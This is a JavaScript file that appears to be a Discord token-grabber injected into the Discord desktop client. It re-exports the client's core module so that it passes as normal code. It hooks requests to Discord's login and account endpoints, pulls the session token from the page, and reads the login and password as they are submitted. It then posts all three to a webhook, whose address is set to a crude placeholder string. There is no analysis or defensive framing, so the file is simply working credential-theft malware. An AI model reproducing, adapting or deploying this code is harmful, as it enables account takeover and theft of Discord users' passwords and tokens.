const { BrowserWindow, session } = require('electron');
const https = require('https');

const config = {
  webhook: 'big black cock!!122',
  api: 'https://discord.com/api/v9/users/@me',

  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login'
    ],
  },
};

const execScript = async (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const sendToDiscordWebhook = async (pl) => {
    const request = https.request(config.webhook, {method : 'POST', headers: {'Content-Type': 'application/json'}}, (response) => { console.log(`:3`); });

    request.write(JSON.stringify({content: `${pl}`}));
    request.end();
};


session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    const unparsed_data = details.uploadData[0].bytes.toString();
    const data = JSON.parse(unparsed_data);
    const token = await execScript(
      `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
    );
    
    switch (true) {
      case details.url.endsWith('login'):
        sendToDiscordWebhook(`\`${token}\`\n\`${data.login}\` | \`${data.password}\``);
        break;
  
      default:
        break;
    }
  });

module.exports = require('./core.asar');